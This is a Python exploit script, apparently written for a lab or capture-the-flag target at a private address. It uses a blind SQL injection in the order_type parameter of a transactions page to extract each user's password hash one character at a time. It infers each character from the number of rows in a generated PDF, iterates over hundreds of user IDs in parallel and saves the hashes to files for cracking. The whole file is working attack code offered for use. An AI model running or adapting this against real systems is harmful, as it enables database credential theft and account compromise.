import pdfplumber
import requests
import concurrent.futures

def getPDF(i, u):

    headers = {
        "cookie": "PHPSESSID=fbdpaj2vviobhodbqs4hekc6ll"
    }
    req = requests.get(f"http://172.18.0.90/transactions.php?order_type=limit+(SELECT+unicode(substr(password,{i},1))+FROM+users+where+id={u})", headers=headers)
    with open(f'user{u}.pdf', 'wb') as f:
        f.write(req.content)
    c = getLen(f'user{u}.pdf')
    return chr(c)

def getLen(f):
    with pdfplumber.open(f) as pdf:
        lenz = 0
        for i in pdf.pages:
            text = i.extract_text()
            t1 = text.split("\n")
            lenz += len(t1)
        return lenz - 3 # Title, description and table's first row
        
def exploit(u):
    print(f"Getting user: {u}")
    md5 = ""
    for i in range(1,33):
        c = getPDF(i, u)
        md5 += c
    
    print(f"Got user: {u}, hash: {md5}")
    with open("withusers.txt","a") as f:
        f.write(f"user: {u}, hash: {md5}\n")
    with open("hashes.txt","a") as f:
        f.write(f"{md5}\n")

def main():
    print("Exploiting...")
    accounts = []
    for i in range(1,295):
        accounts.append(i)

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(exploit, accounts)
    print("Finished :D")

main()
